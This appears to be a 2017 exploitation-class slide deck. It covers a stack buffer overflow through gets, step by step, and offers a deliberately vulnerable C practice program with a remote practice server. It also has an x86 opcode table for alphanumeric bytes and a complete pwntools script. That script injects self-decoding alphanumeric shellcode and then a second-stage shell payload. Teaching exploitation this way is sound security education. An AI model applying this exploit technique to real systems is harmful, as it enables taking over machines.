# Review & Shellcode 2

廖子慶  
2017/3/14 <!-- .element: align="right" -->

---

# Review

--

# Pwn SOP

1. Reverse
1. Find vulnerability(gets->buffer overflow)
1. Control EIP(overwrite return address)
1. Run payload(padding+address of shellcode+shellcode)
1. Get shell

--

## call vul

push eip;  
jmp vul;

| now | adr     | text     | after | adr        | stack   |
| --- | ------- | -------- | ----- | ---------- | ------- |
| EIP | main+17 | call vul | ESP   | 0xffffd61c | main+22 |
|     |         |          | EBP   | 0xffffd628 | 0       |

--

## push ebp

| now | adr | text     | after | adr        | stack      |
| --- | --- | -------- | ----- | ---------- | ---------- |
| EIP | vul | push ebp | ESP   | 0xffffd618 | 0xffffd628 |
|     |     |          |       | 0xffffd61c | ret adr    |
|     |     |          | EBP   | 0xffffd628 | 0          |

--

## mov ebp esp

| now | adr   | text        | after | adr        | stack      |
| --- | ----- | ----------- | ----- | ---------- | ---------- |
| EIP | vul+1 | mov ebp esp | ESP   | 0xffffd618 | 0xffffd628 |
|     |       |             | EBP   | 0xffffd618 | old ebp    |
|     |       |             |       | 0xffffd61c | ret adr    |

--

## sub esp 0x24

| now | adr   | text         | after | adr        | stack   |
| --- | ----- | ------------ | ----- | ---------- | ------- |
| EIP | vul+3 | sub esp 0x18 | ESP   | 0xffffd5f4 | 0       |
|     | vul+6 | sub esp 0xc  | EBP   | 0xffffd618 | old ebp |
|     |       |              |       | 0xffffd61c | ret adr |

--

## gets(ebp-0xc)

| now | adr    | text              | after | adr        | stack   |
| --- | ------ | ----------------- | ----- | ---------- | ------- |
|     |        |                   | ESP   | 0xffffd5ec | vul+18  |
| EIP | vul+9  | lea eax,[ebp-0xc] |       | 0xffffd5f0 | ebp-0xc |
|     | vul+12 | push eax          | buf   | 0xffffd60c | 0       |
|     | vul+13 | call gets         | EBP   | 0xffffd618 | old ebp |
|     |        |                   |       | 0xffffd61c | ret adr |

--

## after gets

| now | adr    | text         | after | adr        | stack       |
| --- | ------ | ------------ | ----- | ---------- | ----------- |
| EIP | vul+18 | add esp 0x10 | ESP   | 0xffffd5f8 | 0           |
|     |        |              | buf   | 0xffffd60c | AAAA        |
|     | vul+21 | sub esp 0x8  | EBP   | 0xffffd618 | AAAA        |
|     |        |              |       | 0xffffd61c | global+16+4 |
|     |        |              |       | 0xffffd6f0 | shellcode   |

--

## strcpy(ebp-0xc,global)

| now | adr    | text              | after | adr        | stack       |
| --- | ------ | ----------------- | ----- | ---------- | ----------- |
| EIP | vul+24 | lea eax,[ebp-0xc] | ESP   | 0xffffd5ec | vul+38      |
|     |        |                   |       | 0xffffd5f0 | global      |
|     |        |                   |       | 0xffffd5f4 | buf         |
|     | vul+27 | push eax          | buf   | 0xffffd60c | AAAA        |
|     | vul+28 | push global       | EBP   | 0xffffd618 | AAAA        |
|     | vul+33 | call strcpy       |       | 0xffffd61c | global+16+4 |
|     |        |                   |       | 0xffffd6f0 | shellcode   |

--

## after strcpy

| now | adr    | text         | after | adr        | stack       |
| --- | ------ | ------------ | ----- | ---------- | ----------- |
| EIP | vul+38 | add esp 0x10 | ESP   | 0xffffd600 | 0           |
|     |        |              | EBP   | 0xffffd618 | AAAA        |
|     |        |              |       | 0xffffd61c | global+16+4 |
|     |        |              |       | 0xffffd6f0 | shellcode   |

| after       | adr        | content     |
| ----------- | ---------- | ----------- |
| global      | 0x0804a040 | AAAA        |
| global+0x10 | 0x0804a050 | global+16+4 |
| global+0x14 | 0x0804a054 | shellcode   |

--

## leave

mov esp ebp;  
pop ebp;

| now | adr    | text  | after | adr        | stack       |
| --- | ------ | ----- | ----- | ---------- | ----------- |
|     |        |       |       | 0xffffd618 | AAAA        |
| EIP | vul+42 | leave | ESP   | 0xffffd61c | global+16+4 |
|     |        |       |       | 0xffffd6f0 | shellcode   |
|     |        |       | EBP   | 0x41414141 | 0           |

--

## ret

pop eip;

| now | adr         | text      | after | adr        | stack     |
| --- | ----------- | --------- | ----- | ---------- | --------- |
| EIP | global+0x14 | shellcode | ESP   | 0xffffd6f0 | shellcode |
|     |             |           | EBP   | 0x41414141 | 0         |

---

# Practice

```c
#include <stdio.h>
void vul(){
    char buf[100];
    printf("local buffer address is 0x%x \n",&buf);
    gets(buf);
    return;
}
int main(int argc, char *argv[])
{
    setvbuf(stdout,0,2,0);
    vul();
    return 0;
}
```

[b](https://drive.google.com/open?id=0B5w3KuqR3zoBNW5hQi1PYldxVVE)

```shell
nc vpn.duckll.tw 9487
```

---

# Alphanumeric shellcode

自己的 code 自己改

--

```python
from pwn import *
import string

for x in string.ascii_letters+string.digits :
    print x,disasm(x+"ABCDEFG").split('\n')[0][6:]
```

```shell
a   61                      popa
b   62 41 42                bound  eax,QWORD PTR [ecx+0x42]
c   63 41 42                arpl   WORD PTR [ecx+0x42],ax
d   64 41                   fs inc ecx
e   65 41                   gs inc ecx
f   66 41                   inc    cx
g   67 41                   addr16 inc ecx
h   68 41 42 43 44          push   0x44434241
i   69 41 42 43 44 45 46    imul   eax,DWORD PTR [ecx+0x42],0x46454443
j   6a 41                   push   0x41
k   6b 41 42 43             imul   eax,DWORD PTR [ecx+0x42],0x43
l   6c                      ins    BYTE PTR es:[edi],dx
m   6d                      ins    DWORD PTR es:[edi],dx
n   6e                      outs   dx,BYTE PTR ds:[esi]
o   6f                      outs   dx,DWORD PTR ds:[esi]
p   70 41                   jo     0x43
q   71 41                   jno    0x43
r   72 41                   jb     0x43
s   73 41                   jae    0x43
t   74 41                   je     0x43
u   75 41                   jne    0x43
v   76 41                   jbe    0x43
w   77 41                   ja     0x43
x   78 41                   js     0x43
y   79 41                   jns    0x43
z   7a 41                   jp     0x43
A   41                      inc    ecx
B   42                      inc    edx
C   43                      inc    ebx
D   44                      inc    esp
E   45                      inc    ebp
F   46                      inc    esi
G   47                      inc    edi
H   48                      dec    eax
I   49                      dec    ecx
J   4a                      dec    edx
K   4b                      dec    ebx
L   4c                      dec    esp
M   4d                      dec    ebp
N   4e                      dec    esi
O   4f                      dec    edi
P   50                      push   eax
Q   51                      push   ecx
R   52                      push   edx
S   53                      push   ebx
T   54                      push   esp
U   55                      push   ebp
V   56                      push   esi
W   57                      push   edi
X   58                      pop    eax
Y   59                      pop    ecx
Z   5a                      pop    edx
0   30 41 42                xor    BYTE PTR [ecx+0x42],al
1   31 41 42                xor    DWORD PTR [ecx+0x42],eax
2   32 41 42                xor    al,BYTE PTR [ecx+0x42]
3   33 41 42                xor    eax,DWORD PTR [ecx+0x42]
4   34 41                   xor    al,0x41
5   35 41 42 43 44          xor    eax,0x44434241
6   36 41                   ss inc ecx
7   37                      aaa
8   38 41 42                cmp    BYTE PTR [ecx+0x42],al
9   39 41 42                cmp    DWORD PTR [ecx+0x42],eax
```

--

## Tips

1. decoder+encoded text
1. push, pop, xor to set the regs
1. read(0,self,0x7a)
1. normal shellcode

--

## Keyword

```
j   6a 41                   push   0x41
X   58                      pop    eax
4   34 41                   xor    al,0x41
H   48                      dec    eax
0   30 41 42                xor    BYTE PTR [ecx+0x42],al
E   45                      inc    ebp
```

--

# DEMO

```python
from pwn import *
#  io=remote('vpn.duckll.tw',9487)
#  io=process('./b')
io=remote('localhost',4000)

buf=io.recvline().split(" ")[-2]
buf=int(buf,16)
padding=112

shellcode="LLLLY"   # dec esp;*4 pop ecx;                    ecx=base
shellcode+="jAX4AH" # push 0x41;pop eax;xor al,0x41;dec eax; al=0xff
shellcode+="0A0"    # xor [ecx+0x30],al;                     '2'^0xff=0xcd
shellcode+="49"     # xor al,0x39                            al=0xc6
shellcode+="0A1"    # xor [ecx+0x31],al;                     'F'^0xc6=0x80
shellcode+="j7X44"  # push 0x37;pop eax;xor al,0x34          al=0x3
shellcode+="jzZ"    # push 0x7a;pop edx;                     edx=0x7a
shellcode=shellcode.ljust(0x30,'E') #padding with inc ebp
shellcode+="2F"

print shellcode

payload="A"*padding+p32(buf+padding+4)+shellcode

#  gdb.attach(io)
io.sendline(payload)
io.sendline(asm("nop\n"*60+shellcraft.sh()))
io.interactive()
```

---

# Protect

## DEP

## W^X

--

# Break

int mprotect(void \*addr, size_t len, int prot);

---

#Q & A

--

#END
